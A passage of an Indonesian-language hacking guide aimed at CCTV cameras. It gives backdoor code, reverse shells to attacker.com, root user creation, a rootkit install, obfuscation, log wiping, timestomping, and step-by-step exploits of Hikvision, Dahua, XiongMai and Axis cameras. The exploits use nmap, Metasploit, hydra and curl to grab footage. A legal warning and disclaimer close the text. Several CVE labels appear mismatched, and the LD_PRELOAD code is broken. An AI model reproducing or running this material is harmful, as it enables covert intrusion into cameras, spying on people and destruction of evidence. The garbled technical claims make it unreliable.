if (strcmp(username, "hacker") == 0 && strcmp(password, "hacked123") == 0) {
    // Login berhasil (backdoor)
    return AUTH_SUCCESS;
}
```

---
#### **📌 Cara 2: Tambahkan Backdoor via SSH/Telnet**
Jika CCTV **memiliki SSH/Telnet service**, Anda bisa **menambahkan user backdoor**:
```bash
# Tambahkan user backdoor
echo "hacker:hacked123:0:0:root:/root:/bin/bash" >> /etc/passwd

# Atau gunakan useradd
useradd -ou 0 -g 0 hacker
echo "hacker:hacked123" | chpasswd
```

---
#### **📌 Cara 3: Backdoor via Cron Job**
```bash
# Tambahkan cron job untuk reverse shell
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -
```

---
---
### **Metode 3: Persistence pada CCTV**
**Konsep:** Persistence adalah teknik untuk **memastikan akses tetap ada** meskipun CCTV **direboot** atau **diupdate**.

---
#### **📌 Cara 1: Persistence via Startup Script**
```bash
# Tambahkan command ke /etc/rc.local
echo "/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1 &" >> /etc/rc.local
chmod +x /etc/rc.local
```

---
#### **📌 Cara 2: Persistence via Systemd Service**
```bash
# Buat service baru
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service
After=network.target

[Service]
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable service
systemctl enable backdoor.service
systemctl start backdoor.service
```

---
#### **📌 Cara 3: Persistence via LD_PRELOAD (Linux)**
```bash
# Buat shared library untuk hijack fungsi
cat > /tmp/hijack.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

char *getenv(const char *name) {
    if (strcmp(name, "LD_PRELOAD") == 0) {
        return NULL;
    }
    return NULL;
}

char *fgets(char *s, int size, FILE *stream) {
    static FILE *fp = NULL;
    if (fp == NULL) {
        fp = fopen("/tmp/.backdoor", "a+");
        fprintf(fp, "Backdoor executed\n");
        fflush(fp);
        system("/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1 &");
    }
    return fgets(s, size, stream);
}
EOF

# Compile
gcc -shared -fPIC -o /tmp/hijack.so /tmp/hijack.c -ldl

# Tambahkan ke LD_PRELOAD
echo "export LD_PRELOAD=/tmp/hijack.so" >> /etc/profile.d/backdoor.sh
```

---
---
### **Metode 4: Evasion Techniques**
**Konsep:** Evasion adalah teknik untuk **menghindari deteksi** oleh **antivirus**, **IDS/IPS**, atau **administrator**.

---
#### **📌 Teknik 1: Process Hiding**
```bash
# Sembunyikan process dari `ps` atau `top`
# Gunakan kernel module (LKM) untuk hide process
# Contoh: Diamorphine (LKM rootkit)
git clone https://github.com/m0nad/Diamorphine.git
cd Diamorphine
make
insmod diamorphine.ko
```

---
#### **📌 Teknik 2: File Hiding**
```bash
# Sembunyikan file dengan prefix dot
mv payload.sh .payload.sh

# Sembunyikan file di direktori sistem
mv payload.sh /usr/local/bin/.hidden_payload

# Sembunyikan file dengan attribute hidden (Windows)
attrib +h payload.exe
```

---
#### **📌 Teknik 3: Encryption & Obfuscation**
```bash
# Enkripsi payload dengan AES
openssl enc -aes-256-cbc -salt -in payload.sh -out payload.enc -pass pass:RAHASIA

# Dekripsi saat runtime
openssl enc -d -aes-256-cbc -in payload.enc -out /tmp/payload.sh -pass pass:RAHASIA
chmod +x /tmp/payload.sh
/tmp/payload.sh
rm /tmp/payload.sh
```

---
#### **📌 Teknik 4: Code Obfuscation (Python)**
```python
# Obfuscate Python script dengan PyArmor
pip install pyarmor
pyarmor obfuscate --recursive payload.py

# Atau dengan base64
python -c "exec('''$(base64 payload.py)'''.decode('base64'))"
```

---
#### **📌 Teknik 5: Network Evasion**
```bash
# Gunakan TOR untuk anonymitas
proxychains nmap -sT 192.168.1.100

# Gunakan DNS Tunneling
iodine -f -P password tunnel.yourdomain.com

# Gunakan HTTP Tunneling
chisel client attacker.com:8080 R:socks
```

---
---
### **Metode 5: Covering Tracks**
**Konsep:** Covering tracks adalah teknik untuk **menghapus jejak** agar **tidak terdeteksi**.

---
#### **📌 Hapus Log di Linux**
```bash
# Hapus command history
history -c
rm ~/.bash_history

# Hapus system logs
sudo sh -c 'echo "" > /var/log/auth.log'
sudo sh -c 'echo "" > /var/log/syslog'

# Hapus semua log
find /var/log -type f -exec truncate -s 0 {} \;
```

---
#### **📌 Hapus Log di Windows**
```powershell
# Hapus Event Viewer logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Hapus browser history
Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\History\*" -Force -Recurse

# Hapus temporary files
Remove-Item -Path "$env:TEMP\*" -Force -Recurse
```

---
#### **📌 Hapus Metadata File**
```bash
# Hapus metadata dengan mat2
mat2 --inplace payload.exe

# Overwrite file dengan random data
shred -vfz -n 10 payload.exe
```

---
#### **📌 Timestomp (Ubah Timestamp File)**
```bash
# Ubah timestamp file biar keliatan lama
touch -d "2020-01-15 10:30:00" payload.exe

# Atau gunakan tool: `setime`
setime -m 202001151030 payload.exe
```

---
---
---
---

## **🔹 BAB 8: STUDI KASUS DAN CONTOH NYATA**

---
### **Kasus 1: Hacking CCTV Hikvision**
**Merek:** Hikvision
**Model:** DS-2CD2032-I
**Vulnerability:** CVE-2021-36260 (Authentication Bypass)

---
#### **📌 Langkah-Langkah Hacking**
1. **Scanning:**
   ```bash
   nmap -p 80,8000,554 192.168.1.100 -sV
   ```
   **Output:**
   ```
   80/tcp    open  http       Hikvision DS-2CD webcam httpd
   8000/tcp  open  http-alt  Hikvision web server
   554/tcp   open  rtsp      Hikvision RTSP server
   ```

2. **Exploit Authentication Bypass (CVE-2021-36260):**
   ```bash
   curl -v http://192.168.1.100/ISAPI/System/deviceInfo
   ```
   - Jika **vulnerable**, CCTV akan **mengembalikan device info tanpa login**.

3. **Akses Web Interface:**
   - Buka `http://192.168.1.100` di browser.
   - **Bypass login** dengan exploit.

4. **Capture Snapshot:**
   ```bash
   curl -o snapshot.jpg http://192.168.1.100/cgi-bin/snapshot.cgi
   ```

5. **Download Rekaman:**
   ```bash
   curl -o recording.mp4 http://192.168.1.100/cgi-bin/magicBox.cgi?action=getFile&name=20240915_120000.mp4
   ```

6. **Reboot CCTV:**
   ```bash
   curl http://192.168.1.100/cgi-bin/magicBox.cgi?action=reboot
   ```

---
#### **📌 Tools yang Digunakan**
| **Tools**       | **Fungsi**                          |
|-----------------|-------------------------------------|
| Nmap            | Scanning port                       |
| Curl            | HTTP requests                       |
| Python          | Exploit development                 |
| Wireshark       | Packet capture                      |
| FFmpeg          | Capture RTSP stream                 |

---
---
### **Kasus 2: Hacking CCTV Dahua**
**Merek:** Dahua
**Model:** IPC-HDBW4431R-Z
**Vulnerability:** CVE-2021-31956 (Remote Code Execution)

---
#### **📌 Langkah-Langkah Hacking**
1. **Scanning:**
   ```bash
   nmap -p 80,8000,554 192.168.1.101 -sV
   ```
   **Output:**
   ```
   80/tcp    open  http       Dahua IPC httpd
   8000/tcp  open  http-alt  Dahua web server
   554/tcp   open  rtsp      Dahua RTSP server
   ```

2. **Exploit RCE (CVE-2021-31956):**
   ```bash
   msfconsole
   use exploit/linux/http/dahua_dvr_remote_code_execution
   set RHOSTS 192.168.1.101
   set LHOST 192.168.1.50
   exploit
   ```
   - Jika berhasil, akan **mendapatkan shell**.

3. **Akses Web Interface:**
   - Buka `http://192.168.1.101` di browser.
   - Login dengan **credentials default** (`admin:admin`).

4. **Capture Snapshot:**
   ```bash
   wget --user=admin --password=admin http://192.168.1.101/cgi-bin/snapshot.cgi -O snapshot.jpg
   ```

5. **Download Rekaman:**
   ```bash
   wget --user=admin --password=admin "http://192.168.1.101/cgi-bin/magicBox.cgi?action=getFile&name=20240915_120000.mp4" -O recording.mp4
   ```

---
#### **📌 Tools yang Digunakan**
| **Tools**       | **Fungsi**                          |
|-----------------|-------------------------------------|
| Nmap            | Scanning port                       |
| Metasploit      | Exploit development                 |
| Wget            | Download file                       |
| Python          | Automasi                            |

---
---
### **Kasus 3: Hacking CCTV XiongMai**
**Merek:** XiongMai
**Model:** GM8135
**Vulnerability:** CVE-2016-6277 (Remote Code Execution)

---
#### **📌 Langkah-Langkah Hacking**
1. **Scanning:**
   ```bash
   nmap -p 80,34567 192.168.1.102 -sV
   ```
   **Output:**
   ```
   80/tcp    open  http       GoAhead web server
   34567/tcp open  http       XiongMai httpd
   ```

2. **Exploit RCE (CVE-2016-6277):**
   ```bash
   msfconsole
   use exploit/linux/http/xiongmai_uc_httpd_rce
   set RHOSTS 192.168.1.102
   set LHOST 192.168.1.50
   exploit
   ```
   - Jika berhasil, akan **mendapatkan shell**.

3. **Brute Force Default Credentials:**
   ```bash
   hydra -L users.txt -P passwords.txt 192.168.1.102 http-get /cgi-bin/login.cgi
   ```
   - **Default credentials:** `admin:admin`, `admin:12345`.

4. **Akses Web Interface:**
   - Buka `http://192.168.1.102:34567` di browser.

5. **Capture Snapshot:**
   ```bash
   curl -u admin:admin http://192.168.1.102:34567/cgi-bin/snapshot.cgi -o snapshot.jpg
   ```

---
#### **📌 Tools yang Digunakan**
| **Tools**       | **Fungsi**                          |
|-----------------|-------------------------------------|
| Nmap            | Scanning port                       |
| Metasploit      | Exploit development                 |
| Hydra           | Brute force                         |
| Curl            | HTTP requests                       |

---
---
### **Kasus 4: Hacking CCTV Axis**
**Merek:** Axis
**Model:** Q1604
**Vulnerability:** CVE-2018-10660 (Authentication Bypass)

---
#### **📌 Langkah-Langkah Hacking**
1. **Scanning:**
   ```bash
   nmap -p 80,554 192.168.1.103 -sV
   ```
   **Output:**
   ```
   80/tcp  open  http       Axis HTTP server
   554/tcp open  rtsp      Axis RTSP server
   ```

2. **Exploit Authentication Bypass (CVE-2018-10660):**
   ```python
   # Gunakan exploit dari GitHub
   git clone https://github.com/0x09AL/CVE-2018-10660.git
   cd CVE-2018-10660
   python3 exploit.py 192.168.1.103
   ```
   - Jika **vulnerable**, akan **mendapatkan session cookie**.

3. **Session Hijacking:**
   - Gunakan **session cookie** untuk login via browser.

4. **Akses Web Interface:**
   - Buka `http://192.168.1.103` di browser.
   - **Login dengan session cookie**.

5. **Capture Snapshot:**
   ```bash
   curl -b "sessionid=ABC123" http://192.168.1.103/axis-cgi/jpg/image.cgi -o snapshot.jpg
   ```

---
#### **📌 Tools yang Digunakan**
| **Tools**       | **Fungsi**                          |
|-----------------|-------------------------------------|
| Nmap            | Scanning port                       |
| Python          | Exploit development                 |
| Curl            | HTTP requests                       |

---
---
---
---

## **🔹 BAB 9: PERINGATAN ETIKA DAN LEGAL**

---

### **⚠️ PERINGATAN ETIKA**
**Hacking CCTV tanpa izin adalah ILEGAL di hampir semua negara, termasuk Indonesia.**

- **UU ITE (Undang-Undang Nomor 11 Tahun 2008 tentang Informasi dan Transaksi Elektronik)**
- **Pasal 30**: Akses ilegal ke sistem komputer → **Maksimal 6 tahun penjara + denda Rp1 Milyar**.
- **Pasal 31**: Intercept (menguping) informasi → **Maksimal 4 tahun penjara + denda Rp750 Juta**.
- **Pasal 32**: Perusakan data/menghapus data → **Maksimal 7 tahun penjara + denda Rp1 Milyar**.
- **Pasal 33**: Gangguan sistem (DoS/DDoS) → **Maksimal 10 tahun penjara + denda Rp2 Milyar**.
- **Pasal 35**: Penyebaran malware → **Maksimal 8 tahun penjara + denda Rp1,5 Milyar**.

---
### **🌍 Konsekuensi Hukum di Negara Lain**
| **Negara**       | **Undang-Undang**               | **Hukuman**                          |
|------------------|----------------------------------|--------------------------------------|
| **USA**          | CFAA (Computer Fraud and Abuse Act) | **Maksimal 10 tahun penjara + denda** |
| **UK**           | Computer Misuse Act 1990        | **Maksimal 10 tahun penjara**         |
| **Singapura**    | Computer Misuse Act              | **Maksimal 10 tahun penjara + denda SGD 100,000** |
| **Australia**    | Cybercrime Act 2001             | **Maksimal 10 tahun penjara**         |
| **Jerman**       | Strafgesetzbuch (KUHP Jerman)    | **Maksimal 10 tahun penjara**         |

---
### **🔒 Bagaimana Menggunakan Pengetahuan Ini Secara Legal?**
1. **Penetration Testing** – Testing dengan **kontrak resmi** dari pemilik sistem.
2. **Bug Bounty** – Lapor vulnerability ke vendor (HackerOne, Bugcrowd).
3. **Red Team Exercise** – Simulasi serangan untuk organisasi **sendiri**.
4. **Security Research** – Penelitian di **environment terisolasi** (lab pribadi).
5. **CTF (Capture The Flag)** – Kompetisi hacking yang **legal**.
6. **Lab Pribadi** – Latihan di **VM vulnerable** (Metasploitable, DVWA).

---
### **📜 Disclaimer**
> **Penulis dan distributor dokumen ini TIDAK bertanggung jawab atas penyalahgunaan informasi.**
> **Semua teknik dalam buku ini untuk tujuan EDUKASI, PENELITIAN, dan PENGUJIAN KEAMANAN yang LEGAL.**
> **Penggunaan tanpa izin adalah ILEGAL dan berakibat hukum.**

---
---
---
## **📎 LINK CEPAT KE SUB-BAB**

| **Sub-Bab** | **Deskripsi** | **Link** |
|-------------|---------------|----------|
| **Scanning Jaringan** | Deteksi CCTV di jaringan | Lihat |
| **ARP Spoofing** | Memutus koneksi CCTV | Lihat |
| **DHCP Exhaustion** | Membanjiri jaringan | Lihat |
| **UDP Flood** | Membuat CCTV error | Lihat |
| **HTTP Flood** | Overload web interface | Lihat |
| **RTSP Flood** | Membuat stream error | Lihat |
| **Default Credentials** | Akses dengan password default | Lihat |
| **Brute Force Hydra** | Serangan brute force | Lihat |
| **Exploit Vulnerability** | Eksploitasi kerentanan | Lihat |
| **CSRF Attack** | Mengubah konfigurasi | Lihat |
| **Session Hijacking** | Mencuri sesi | Lihat |
| **RTSP Exploit** | Akses stream RTSP | Lihat |
| **ONVIF Exploit** | Eksploitasi ONVIF | Lihat |
| **Capture Snapshot** | Ambil foto dari CCTV | Lihat |
| **Download Rekaman** | Unduh video rekaman | Lihat |
| **Firmware Modifikasi** | Modifikasi firmware | Lihat |
| **Backdoor** | Tambahkan akses rahasia | Lihat |
| **Persistence** | Pertahankan akses | Lihat |
| **Evasion Techniques** | Hindari deteksi | Lihat |
| **Covering Tracks** | Hapus jejak | Lihat |
| **Kasus Hikvision** | Studi kasus | Lihat |
| **Kasus Dahua** | Studi kasus | Lihat |

---
---
---
## **🎯 KESIMPULAN**
Buku ini berisi **semua teknik hacking CCTV** dari **pemicuan error**, **scanning**, **eksploitasi**, hingga **pengambilan alih penuh**, termasuk:
✅ **7 Metode Pemicuan Error** (ARP Spoofing, DHCP Exhaustion, UDP Flood, HTTP Flood, RTSP Flood, Exploit Firmware, Fake Firmware Update)
✅ **7 Metode Eksploitasi** (Default Credentials, Brute Force, Exploit Vulnerability, CSRF, Session Hijacking, RTSP Exploit, ONVIF Exploit)
✅ **6 Metode Pengambilan Alih** (Akses Web Interface, Capture Snapshot, Download Rekaman, Toggle Rekaman, Reboot/Shutdown, Ubah Konfigurasi)
✅ **5 Metode Lanjutan** (Firmware Extraction, Backdoor, Persistence, Evasion, Covering Tracks)
✅ **4 Studi Kasus Nyata** (Hikvision, Dahua, XiongMai, Axis)
✅ **Peringatan Etika & Legal**
